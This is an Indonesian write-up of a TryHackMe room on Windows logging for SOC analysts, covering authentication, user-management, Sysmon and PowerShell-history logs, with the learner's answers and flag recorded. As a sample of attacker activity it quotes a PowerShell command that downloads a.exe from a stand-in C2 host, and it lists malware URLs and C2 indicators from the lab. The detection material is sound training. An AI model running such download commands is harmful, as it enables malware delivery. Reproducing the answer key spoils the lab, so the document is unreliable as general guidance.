# Pencatatan-Log-Windows-untuk-SOC-
Mulailah perjalanan pemantauan Windows Anda dengan mempelajari cara menggunakan log sistem untuk mendeteksi ancaman


Perkenalan
Analis SOC menghabiskan sebagian besar waktu mereka untuk memilah peringatan dan memburu ancaman - menggunakan log di SIEM . Untuk membedakan yang baik dari yang buruk, analis harus memahami log dengan baik: bagaimana tampilannya, bagaimana menafsirkannya, dan tindakan berbahaya apa yang ditunjukkannya. Ruangan ini memulai perjalanan panjang Anda ke dalam pencatatan log Windows - keterampilan kunci bagi setiap analis SOC atau profesional DFIR .

Tujuan pembelajaran
Pahami cara menemukan dan menafsirkan log peristiwa Windows yang penting.
Pelajari hal-hal berharga untuk memantau sumber log seperti Sysmon dan PowerShell.
Siapkan penggunaan log yang disebutkan di SOC -SIM dan ruangan-ruangan berikut.
Latih keterampilan analisis log Anda pada beberapa kumpulan data log peristiwa.


# Apa yang Dicatat
Gambaran Umum Pencatatan Log
Setiap kali Anda menjalankan program, membuat file, atau sekadar masuk ke laptop Anda, peristiwa tersebut diproses oleh sistem operasi (OS) Anda . Kemudian, OS dapat mencatat peristiwa tersebut, yang berarti akan menambahkan baris ke jurnal tertentu, yang menyatakan waktu, detail tindakan, dan pengguna di balik tindakan tersebut. Setiap peristiwa yang tercatat disebut log, dan pencatatan yang tepat memastikan bahwa semua aktivitas pengguna dan sistem tercatat, sehingga membantu SOC dalam aktivitas berikut:

Respons Insiden : Log dapat menunjukkan kapan dan bagaimana serangan terjadi.
Pencarian Ancaman : Log memungkinkan Anda mencari tanda-tanda aktivitas berbahaya.
Pemberian Peringatan dan Triage : Log merupakan elemen dasar dari setiap aturan peringatan atau deteksi.


Anatomi Entri Log
Windows adalah sistem operasi yang menarik karena memiliki kemampuan pencatatan (logging) yang sangat kuat, tetapi membutuhkan banyak pengetahuan untuk membaca dan memahami log tersebut. Tantangan pertama Anda mungkin hanya untuk membuka log, karena log tersebut disimpan dalam format biner di dalam C:\Windows\System32\winevt\Logsfolder:

<img width="1683" height="424" alt="image" src="https://github.com/user-attachments/assets/a97bc747-c7c8-4133-884c-466edc0d79de" />
Setiap file EVTX sesuai dengan kategori log tertentu. Misalnya, Log Aplikasi berisi peristiwa yang dicatat oleh aplikasi mode pengguna seperti server web IIS atau basis data MS SQL, dan Log Keamanan mencatat peristiwa seperti upaya masuk, aktivitas proses, dan manajemen pengguna.

Membaca Log Peristiwa
Kita akan menggunakan Event Viewer untuk ruangan ini, sebuah alat bawaan yang memungkinkan Anda untuk melihat dan mengelola log peristiwa. Untuk membuka Event Viewer, cari "Event Viewer" menggunakan Pencarian Windows atau tekan Win + R, ketik eventvwr, dan tekan Enter. Setelah alat dimuat, Anda dapat melihat semua log sistem yang diuraikan, dikelompokkan, dan siap untuk dianalisis:

Sumber Log : Setiap file EVTX sesuai dengan satu item di panel sebelah kiri.
Daftar Log : Setiap baris yang Anda lihat adalah satu peristiwa yang berisi beberapa properti yang dapat Anda urutkan:
Kata kunci : Untuk beberapa kejadian, menunjukkan apakah tindakan tersebut berhasil atau tidak.
Tanggal dan Waktu : Cap waktu saat peristiwa terjadi (waktu sistem, bukan UTC !)
ID Acara : Nomor unik untuk nama acara (misalnya, login yang gagal selalu 4625)
Detail Log : Isi sebenarnya dari log, dalam format teks biasa atau XML (tab "Detail")
Menu Filter : Gunakan tombol "Filter Log Saat Ini" dan "Cari" untuk memfilter log.
<img width="1280" height="398" alt="image" src="https://github.com/user-attachments/assets/cee1394d-bd63-49a7-98e4-53b519b365d2" />

Apa yang Dicatat
Terdapat lebih dari 500 ID peristiwa hanya untuk log Keamanan dan ribuan ID peristiwa lainnya secara total! Namun, tidak semua peristiwa dicatat secara default dan tidak semua peristiwa didokumentasikan dengan benar, jadi di ruangan ini kita akan menjelajahi log yang paling bermanfaat untuk rutinitas SOC sehari-hari .

What Is Logged
Tugas 3
Security Log: Authentication

Ringkasan
Sebagai analis SOC , Anda tidak dapat mengetahui sebelumnya serangan apa yang akan Anda tangani besok dan log mana yang perlu Anda triase. Namun, dari semua log Windows yang diaktifkan secara default, log peristiwa Keamanan adalah yang paling berharga. Mari kita mulai perjalanan kita dari dua log Keamanan yang paling penting: Login Berhasil ( 4624 ) dan Login Gagal ( 4625 ).

ID Acara	Tujuan	Pencatatan	Keterbatasan
4624
(Login Berhasil)	Mendeteksi aktivitas login RDP /jaringan yang mencurigakan dan mengidentifikasi titik awal serangan.	Anda sudah masuk ke sistem pada mesin target, yaitu mesin yang ingin Anda akses.	Berisik . Anda akan melihat ratusan peristiwa login per menit pada server yang sibuk.
4625
(Gagal Masuk)	Mendeteksi serangan brute force, password spraying, atau pemindaian kerentanan.	Anda sudah masuk ke sistem pada mesin target, yaitu mesin yang ingin Anda akses.	Tidak konsisten . Log tersebut memiliki banyak peringatan yang dapat menyesatkan Anda sehingga Anda salah memahami peristiwa tersebut.
Struktur 4624
Server Windows pada umumnya dapat menghasilkan puluhan peristiwa login per menit, dan setiap peristiwa login sering kali terdiri dari banyak bidang yang berbeda. Namun, Anda dapat mencakup sebagian besar kasus L1/L2 hanya dengan memeriksa beberapa bidang peristiwa inti pada gambar di bawah ini. Anda juga dapat membaca lebih lanjut tentang bidang dan jenis login lainnya di  Ensiklopedia ID Peristiwa .

<img width="1194" height="470" alt="image" src="https://github.com/user-attachments/assets/3840e947-9127-4577-b406-fec4ad4c2ba2" />

Penggunaan 4624/4625
Bahkan administrator TI berpengalaman pun sering mengandalkan pakar keamanan untuk membedakan kejadian buruk dari kejadian baik, jadi jangan khawatir jika buku kerja di bawah ini tampak kompleks pada awalnya. Luangkan waktu Anda dan anggap tugas ini sebagai pengetahuan dasar yang akan Anda gunakan dalam praktik untuk banyak ruangan mendatang!



Deteksi Serangan Brute Force RDP (Perluas Saya)
Buka log keamanan dan filter untuk ID peristiwa 4625 (Upaya login gagal)
Cari peristiwa dengan Tipe Masuk 3 dan 10 (Masuk melalui Jaringan dan RDP )
Untuk sebagian besar sistem modern, tipe login akan bernilai 3 (karena NLA diaktifkan secara default).
Untuk sistem yang lebih lama atau salah konfigurasi, tipe login akan menjadi 10 (karena NLA tidak digunakan).
Setiap peristiwa kini layak mendapat perhatian Anda, tetapi tanda-tanda peringatan utamanya adalah:
Banyak pengguna yang mencoba membobol kata sandi seperti  admin ,  helpdesk , dan cctv (Menunjukkan serangan penyebaran kata sandi).
Banyak kegagalan login pada satu akun, biasanya  Administrator (Menunjukkan serangan brute force)
Nama Workstation tidak sesuai dengan pola perusahaan (misalnya kali, bukan THM -PC-06 )
Alamat IP sumber tidak diharapkan (misalnya, printer Anda mencoba terhubung ke Windows Server Anda).
Analisis Login RDP (Perluas Saya)
Buka log keamanan dan filter untuk ID peristiwa 4624 (Login berhasil)
Cari peristiwa dengan Tipe Masuk 10 ( masuk melalui RDP )
Jika NLA diaktifkan, setiap peristiwa masuk RDP didahului oleh peristiwa 4624 lainnya dengan tipe masuk 3.
Untuk mendapatkan Nama Workstation yang sebenarnya, Anda perlu memeriksa kejadian tipe login 3 sebelumnya.
Tanda-tanda peringatan Anda mungkin berupa serangan brute force sebelumnya atau alamat IP/hostname sumber yang mencurigakan.
Jika Anda berasumsi bahwa upaya login tersebut memang berbahaya, cari tahu apa yang terjadi selanjutnya:
Windows memberikan ID Masuk (Logon ID) untuk setiap login yang berhasil (misalnya 0x5D6AC)
ID login adalah pengidentifikasi sesi yang unik. Simpan untuk analisis di masa mendatang!


# Jawablah pertanyaan-pertanyaan di bawah ini.
Buka file " Practice-Security.evtx " di Desktop VM.
IP mana yang melakukan serangan brute force pada THM-PC?

cari filter curent dengan  event id 4625 ini adalah cara deteksi anacaman upaya login gagal
jawaban : 10.10.53.248

Jawaban yang Benar

Pengguna mana yang terkena dampak serangan tersebut?

lihat di detail Event property yang mana dia menargetkan Administrator 
jawaban : Administrator

Jawaban yang Benar

Apa ID Masuk (Logon ID) dari login RDP berbahaya tersebut?
Catatan: Login yang Anda cari memiliki Tipe Masuk (Logon Type) 10.

Jika ragu, periksa kolom “Jenis Masuk” (Logon Type).

cari di logon id 4624 ini adalah code logon berhasil 

New Logon:
	Security ID:		THM-PC\Administrator
	Account Name:		Administrator
	Account Domain:		THM-PC
	Logon ID:		0x183C36D
	Linked Logon ID:		0x0


jawaban 0x183C36D

# Log Keamanan: Manajemen Pengguna
Ringkasan
- Hai Michael, apakah "svc_sysrestore" akunmu? Aku belum pernah melihatnya di daftar pengguna sebelumnya.
- Bukan, tapi kemungkinan itu terkait dengan Windows; lebih baik jangan diubah agar tidak menimbulkan masalah di kemudian hari.

Di atas adalah contoh diskusi khas departemen TI yang sering berujung pada serangan ransomware. Namun, dengan sedikit pengetahuan tentang otentikasi dan  peristiwa manajemen pengguna , sangat mudah untuk mengetahui seluruh riwayat akun pengguna mana pun. Berikut adalah rincian ID peristiwa umum yang dapat Anda gunakan:

ID Acara	Keterangan	Penggunaan yang Berbahaya
4720 / 4722 / 4738	Akun pengguna telah
dibuat/diaktifkan/diubah.	Penyerang mungkin membuat akun pintu belakang atau bahkan mengaktifkan akun lama untuk menghindari deteksi. 
4725  / 4726	Akun pengguna telah
dinonaktifkan/dihapus.	Dalam beberapa kasus tingkat lanjut, pelaku ancaman dapat menonaktifkan akun SOC yang memiliki hak istimewa untuk memperlambat tindakan mereka.
4723 / 4724	Seorang pengguna mengubah kata sandinya /
Kata sandi pengguna telah direset	Dengan hak akses yang cukup, pelaku ancaman dapat mengatur ulang kata sandi dan kemudian mengakses pengguna yang dibutuhkan.
4732 / 4733	Seorang pengguna ditambahkan ke/
dihapus dari grup keamanan.	Penyerang sering menambahkan akun backdoor mereka ke grup istimewa seperti " Administrator ".
Struktur Acara Manajemen Pengguna
Semua peristiwa manajemen pengguna memiliki struktur yang serupa dan dapat dibagi menjadi tiga bagian: siapa yang melakukan tindakan (Subjek), siapa yang menjadi target (Objek), dan perubahan persis apa yang dilakukan (Detail):

Subjek : Akun yang melakukan tindakan. Perhatikan kolom ID Masuk - Anda dapat menggunakannya untuk menghubungkan peristiwa ini dengan peristiwa masuk 4624 sebelumnya!
Objek : Nama objek ini dapat berbeda tergantung pada ID peristiwa (misalnya Akun Baru atau Anggota), tetapi artinya selalu sama - target dari tindakan tersebut.
Detail : Grup target untuk kejadian 4732 dan 4733, atau atribut pengguna baru seperti nama lengkap atau pengaturan masa berlaku kata sandi untuk kejadian 4720.

<img width="1313" height="630" alt="image" src="https://github.com/user-attachments/assets/c83734d5-f15d-4fb9-b45a-e2a71901dcfb" />

Penggunaan Acara Manajemen Pengguna
Banyak pelanggaran keamanan data yang sebenarnya melibatkan setidaknya beberapa tindakan manipulasi pengguna, misalnya, pelaku ransomware ini mengatur ulang semua akun pengguna ke satu kata sandi untuk memperlambat pemulihan, dan penyerang ini membuat akun admin baru untuk mempertahankan aktivitas mereka . Lihat buku kerja di bawah ini untuk mempelajari cara memburu serangan serupa:

$$$ Burulah Pengguna yang Terlibat Pintu Belakang (Perluas Saya)
Buka log keamanan dan filter untuk ID peristiwa 4720 / 4732
Tinjau setiap kejadian secara manual; tanda-tanda peringatan Anda adalah:
Tidak ada seorang pun dari departemen TI Anda yang dapat mengkonfirmasi tindakan tersebut.
Perubahan dilakukan di luar jam kerja atau pada akhir pekan.
Nama pengguna yang dimaksud tidak dikenal atau tidak terduga bagi Anda
(misalnya " adm.old.2008 " saat membuat pengguna Windows baru)
Nama pengguna target tidak mengikuti pola penamaan yang biasa
(misalnya " backup " alih-alih " thm_svc_backup ").
Jika Anda telah memastikan bahwa tindakan tersebut bersifat jahat, cari tahu detail loginnya:
Salin kolom ID Masuk dari acara 4720 / 4732 Anda.
Temukan peristiwa login yang sesuai dengan ID Login yang sama.
Silakan merujuk pada buku kerja dari tugas sebelumnya untuk analisis lebih lanjut.


Jawablah pertanyaan-pertanyaan di bawah ini.
Lanjutkan dengan file " Practice-Security.evtx " di Desktop VM.
Pengguna mana yang dibuat oleh penyerang segera setelah login RDP?

svc_sysrestore

Jawaban yang Benar

Ke dalam dua grup istimewa manakah pengguna backdoor ditambahkan?
(Jawablah sesuai urutan abjad, misalnya "Administrator, Pengguna Tingkat Lanjut")

Backup Operators, Remote Desktop Users

Jawaban yang Benar

Apakah kolom ID Masuk sesuai dengan yang Anda lihat pada tugas sebelumnya (Ya/Tidak)?

Yea

Jawaban yang Benar

# Sysmon: Pemantauan Proses
Ringkasan
- Sarah, apakah kamu baru-baru ini membuka file dari internet?
- Tentu saja tidak, kenapa? Aku tidak pernah membuka file yang tidak tepercaya.
- Nah, IP-mu mencoba melakukan serangan brute-force ke server produksi kami.

Di atas adalah contoh mengapa tim SOC membutuhkan pencatatan yang lebih detail daripada sekadar upaya otentikasi. Bahkan jika Anda tahu siapa yang diretas, Anda sering kali tidak tahu bagaimana caranya. Di situlah pemantauan proses sangat berguna, dan ada dua cara untuk mengaktifkannya di Windows:

Kode Acara	Tujuan	Keterbatasan
4688
(Log Keamanan: Pembuatan Proses)	Catat setiap kali proses baru diluncurkan, termasuk baris perintah dan detail proses induknya.	Secara default dinonaktifkan, Anda perlu mengaktifkannya dengan mengikuti  dokumentasi resmi.
1
( Sysmon : Pembuatan Proses)	Ganti kode kejadian 4688 dan sediakan bidang yang lebih canggih seperti hash proses dan tanda tangannya.	Sysmon adalah alat eksternal yang tidak diinstal secara default. Kunjungi halaman resmi Sysmon.
Sysmon vs Log Keamanan
Sysmon adalah alat gratis dari rangkaian Microsoft Sysinternals yang menjadi standar de facto untuk pemantauan tingkat lanjut selain log sistem bawaan. Untuk tugas ini, kita akan langsung menganalisis log Sysmon , tetapi Anda dapat mempelajari lebih lanjut tentang alat hebat ini di ruang TryHackMe lainnya .

Jadi, jika saya harus memilih antara mengaktifkan ID peristiwa 4688 yang dasar dan berisik atau meluangkan waktu untuk menginstal Sysmon guna menerima log yang lebih canggih dan fleksibel, saya akan memilih Sysmon , dan Anda pun disarankan untuk melakukan hal yang sama! Setelah terinstal, log Sysmon dapat ditemukan di Event Viewer di bawah Applications & Services -> Microsoft -> Windows -> Sysmon -> Operational.
<img width="1400" height="498" alt="image" src="https://github.com/user-attachments/assets/bdbc305f-5ede-4ec8-a1b1-d6841f5d4902" />


ID Peristiwa Sysmon 1 dalam Aksi
Seperti yang Anda lihat pada tangkapan layar di atas, ID peristiwa 1 memiliki banyak bidang yang berbeda, yang terpenting dapat dikelompokkan sebagai berikut:

Info Proses : Konteks dari proses yang diluncurkan, termasuk PID -nya , jalur (gambar), dan baris perintah.
Informasi Induk : Konteks proses induk, sangat berguna untuk membangun pohon proses atau rantai serangan.
Informasi Biner : Hash proses, tanda tangan, dan metadata PE . Anda akan membutuhkannya untuk ruangan yang lebih canggih.
Konteks Pengguna : Pengguna yang menjalankan proses dan, yang terpenting, ID Masuk - sama seperti di log Keamanan.
Karena hampir semua serangan bekerja pada tingkat endpoint dan membutuhkan setidaknya beberapa proses untuk diluncurkan guna membobol sistem atau mengeksfiltrasi data darinya, pemantauan proses adalah sumber log terpenting bagi tim SOC mana pun . Gunakan buku kerja berikut untuk melakukan analisis dasar terhadap setiap peluncuran proses:

Proses Analisis Peluncuran (Perluas Saya)
Buka log Sysmon dan filter untuk ID peristiwa 1.
Periksa kembali kolom-kolom dari grup informasi proses dan biner. Tanda-tanda peringatannya adalah:
Gambar tersebut berada di direktori yang tidak umum seperti C:\Temp atau C:\Users\Public
Proses tersebut diberi nama yang mencurigakan, seperti aa.exe atau jqyvpqldou.exe
Hash proses ( MD5 atau SHA256) cocok sebagai malware di  VirusTotal.
Periksa kembali kolom-kolom dari grup proses induk. Tanda-tanda peringatannya adalah:
Parent cocok dengan tanda bahaya dari langkah 2 (nama, jalur, atau hash yang mencurigakan)
Parent tidak diharapkan (misalnya Notepad menjalankan beberapa perintah CMD)
Jika masih ragu, ikuti langkah-langkah selanjutnya hingga Anda yakin dengan keputusan Anda:
Temukan kejadian sebelumnya di mana ProcessId sama dengan ParentProcessId dalam kejadian Anda.
Analisis dengan mengikuti langkah 2 dan 3 (induk, nama, jalur, atau hash yang mencurigakan)
Terakhir, lacak rantai serangan dengan memfilter semua peristiwa Keamanan dan Sysmon dengan ID Masuk yang sama.


Jawablah pertanyaan-pertanyaan di bawah ini.
Buka file " Practice-Sysmon.evtx " di Desktop VM.
Browser web apa yang digunakan Sarah untuk menjelajahi web?

Google Chrome

Jawaban yang Benar

File mana yang diunduh Sarah dari browser?

C:\Users\sarah.miller\Downloads\ckjg.exe

Jawaban yang Benar

Dari URL mana file tersebut diunduh?
Catatan: Gunakan event Sysmon lainnya untuk mengetahuinya!

http://gettsveriff.com/bgj3/ckjg.exe

Jawaban yang Benar

# Sysmon: File dan Jaringan
Ringkasan
Seperti yang telah Anda lihat pada tugas sebelumnya, Sysmon dapat menyediakan lebih dari sekadar peristiwa pembuatan proses. Ia dapat mencatat perubahan file dan registri, koneksi jaringan, kueri DNS , dan banyak peristiwa penting lainnya. Selain itu, Anda dapat mengkonfigurasi apa yang akan dicatat dan apa yang akan dilewati, tidak seperti log default. Ruangan ini, misalnya, menggunakan  konfigurasi populer milik Florian , tetapi Anda bebas mengubahnya agar sesuai dengan kebutuhan Anda. Mari kita lihat empat ID peristiwa lainnya :

ID Acara	Alternatif Log Keamanan	Tujuan Acara
11 / 13
(Pembuatan File / Pengaturan Nilai Registri)	4656 untuk perubahan file dan 4657 untuk perubahan registri, keduanya dinonaktifkan secara default.	Mendeteksi file yang dijatuhkan oleh malware atau perubahannya pada registri (misalnya untuk persistensi ). 
3 / 22
(Koneksi Jaringan / Permintaan DNS )	Tidak ada alternatif langsung, memerlukan konfigurasi firewall dan DNS tambahan.	Mendeteksi lalu lintas dari proses yang tidak tepercaya atau ke tujuan berbahaya yang dikenal.
Struktur Peristiwa Sysmon

<img width="1430" height="320" alt="image" src="https://github.com/user-attachments/assets/ee2b8045-0e9d-4ea3-9d62-c38a6cc0c805" />

Perhatikan tangkapan layar di atas - meskipun setiap ID peristiwa memiliki tujuannya masing-masing, kolom yang disorot dengan warna oranye mengikuti struktur yang sama. Selain itu, perhatikan bahwa beberapa kolom penting, seperti ID Masuk atau informasi proses induk, hilang. Logikanya di sini adalah Anda menggunakan kolom ProcessId untuk menemukan ID peristiwa 1 yang sesuai (Pembuatan Proses) dan mendapatkan konteks lengkap di sana.

Penggunaan Peristiwa Sysmon
Meskipun peristiwa pembuatan proses memberikan konteks yang cukup untuk mendeteksi skenario pelanggaran umum, log tambahan dapat sangat penting untuk merekonstruksi rantai serangan lengkap dan memastikan tidak ada yang terlewatkan. Misalnya, Anda memerlukan log jaringan untuk mengidentifikasi ke mana data dieksfiltrasi, dan log perubahan registri untuk memeriksa konfigurasi sistem mana yang dimodifikasi oleh pelaku ancaman.

Analisis Aktivitas Proses (Perluas Saya)
Salin kolom ProcessId dari ID peristiwa 1
Cari peristiwa Sysmon lain dengan  ProcessId yang sama
Berikut adalah beberapa tanda peringatan (red flags) untuk masalah koneksi jaringan:
Koneksi ke IP eksternal pada port 80 atau pada port non-standar seperti 4444
Koneksi ke IP berbahaya yang dikenal (misalnya dengan memeriksa di VirusTotal )
Permintaan DNS ke domain yang mencurigakan (*.top, *.click, atau hpdaykfpadvsl.com)
Berikut adalah beberapa tanda peringatan untuk perubahan file dan registri:
Berkas-berkas dipindahkan ke direktori sementara seperti C:\Temp atau C:\Users\Public
File yang dijatuhkan adalah skrip ( .bat atau .ps1 ) atau file yang dapat dieksekusi ( .exe atau .com )
File atau kunci registri yang dibuat digunakan untuk persistensi (akan dibahas nanti!).


Jawablah pertanyaan-pertanyaan di bawah ini.
Lanjutkan dengan file " Practice-Sysmon.evtx " di Desktop VM.
File mana yang dibuat oleh malware yang diunduh agar tetap ada di host?

C:\Users\sarah.miller\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\DeleteApp.url

Jawaban yang Benar

Malware tersebut terhubung ke server Command & Control yang mana?
(Jawab dalam format IP:Port, contoh: 1.1.1.1:80)

193.46.217.4:7777

Jawaban yang Benar

Terakhir, domain mana yang sesuai dengan IP berbahaya tersebut?

hkfasfsafg.click

Jawaban yang Benar

# PowerShell: Mencatat Perintah
Ringkasan
PowerShell adalah alat ampuh yang terintegrasi dalam Windows yang sangat disukai penyerang untuk disalahgunakan. Terutama karena alat ini tepercaya dan mampu mengunduh malware, mendeteksi sistem, mengekstrak data, dan bahkan teknik canggih seperti injeksi proses. Namun, Anda tidak akan dapat menangkap perintahnya hanya dengan menggunakan log pembuatan proses seperti ID peristiwa Sysmon 1. Lihatlah prompt perintah di bawah ini:

Perintah yang Dimasukkan
PowerShell
Terminal
PS C:\> Get-ChildItem
PS C:\> Get-Content secrets.txt
PS C:\> Get-LocalUser; Get-LocalGroup
PS C:\> Invoke-WebRequest http://c2server.thm/a.exe -OutPath C:\Temp\a.exe 
Di sini, pelaku ancaman berhasil membaca file sensitif, melihat pengguna dan grup lokal, dan bahkan mengunduh malware ke direktori Temp. Namun, Anda hanya akan melihat satu ID peristiwa 1 yang menyatakan bahwa powershell.exe diluncurkan, tanpa informasi tentang perintah yang dieksekusi.

Cara Kerjanya
Setiap program memiliki tujuan spesifik: firefox.exe adalah peramban web, notepad.exe adalah editor teks, dan whoami.exe hanya menampilkan nama pengguna Anda. Jika Anda hanya menjelajahi web, Anda mungkin hanya membuat satu proses Firefox. Namun, untuk setiap tugas di luar cakupan seperti akses RDP atau pengeditan foto, Anda harus membuka program baru dan membuat log tambahan.

Di sisi lain, PowerShell adalah alat serbaguna yang ampuh untuk mengelola sistem. Setelah Anda menjalankannya powershell.exe, Anda dapat menjalankan ratusan perintah berbeda dalam sesi terminal yang sama tanpa membuat proses baru untuk setiap tindakan. Inilah mengapa Sysmon tidak terlalu membantu di sini, dan Anda perlu menemukan pendekatan pencatatan log alternatif.

File Riwayat PowerShell
Setidaknya ada lima metode untuk memantau PowerShell , masing-masing dengan kelebihan dan kekurangannya sendiri. Meskipun Anda dapat melihat ruang Logless Hunt dan meneliti topik AMSI dan Transcript Logging, di ruang ini, kita akan fokus pada cara sederhana namun efektif untuk melacak perintah PowerShell - file riwayat PowerShell :

C:\Users\<USER>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
Berkas riwayat PowerShell adalah berkas teks biasa yang dibuat secara otomatis oleh PowerShell . Berkas ini hanya mencatat setiap perintah yang Anda ketikkan ke dalam jendela PowerShell dan langsung diperbarui saat Anda menekan  Enter untuk mengirimkan perintah:

<img width="1359" height="434" alt="image" src="https://github.com/user-attachments/assets/783d9edd-292e-4727-b3e6-4e52d8603b0a" />

Catatan Penting
File riwayat sangat berguna untuk melacak tindakan berbahaya seperti pendeteksian sistem atau pengunduhan malware.
Berkas riwayat dibuat untuk setiap pengguna, artinya Anda mungkin melihat lima berkas jika ada lima pengguna sistem yang aktif.
File ini akan tetap ada setelah sistem dihidupkan ulang kecuali dihapus secara manual dan menyimpan semua perintah PowerShell yang dimasukkan untuk selamanya.
Program ini tidak mencatat output perintah dan tidak menampilkan isi skrip (misalnya saat dijalankan  powershell .\script.ps1).
Jawablah pertanyaan-pertanyaan di bawah ini.
Periksa riwayat PowerShell Administrator pada VM yang terlampir.
Perintah PowerShell mana yang dieksekusi pertama kali?

Get-ComputerInfo

Jawaban yang Benar
Kapan Administrator menjalankan perintah PS pertama? (Format: 18 April 2025)
Catatan: Anda mungkin perlu mengklik kanan file riwayat dan membuka "Properti" untuk mendapatkan jawabannya!

May 18, 2025

Jawaban yang Benar

Bisakah Anda menemukan flag yang tersimpan di riwayat PowerShell? (Format: THM{...})
Catatan: Anda mungkin perlu memeriksa riwayat PS pengguna lokal lainnya!

THM{it_was_me!}

Jawaban


Selamat atas keberhasilan Anda menyelesaikan ruangan ini! Dengan mempelajari cara membaca dan menghubungkan log dari berbagai sumber, Anda sekarang lebih siap untuk melacak serangan nyata dan mendeteksi pelaku ancaman di setiap tahap Cyber ​​Kill Chain.

Poin-Poin Penting
Pahami cara membaca ID peristiwa 4624 dan 4625 - Anda akan sering menemukannya dalam peran analis SOC Anda.
Kelompokkan log berdasarkan ID Masuk dan ID Proses - cara yang bagus untuk melihat rantai serangan dengan cepat.
Pelajari Sysmon dan pastikan untuk menggunakannya - Sysmon memberikan konteks paling lengkap tentang apa yang sedang terjadi.
Jangan lupakan pencatatan PowerShell - penggunaannya dalam serangan siber meningkat pesat setiap tahunnya.
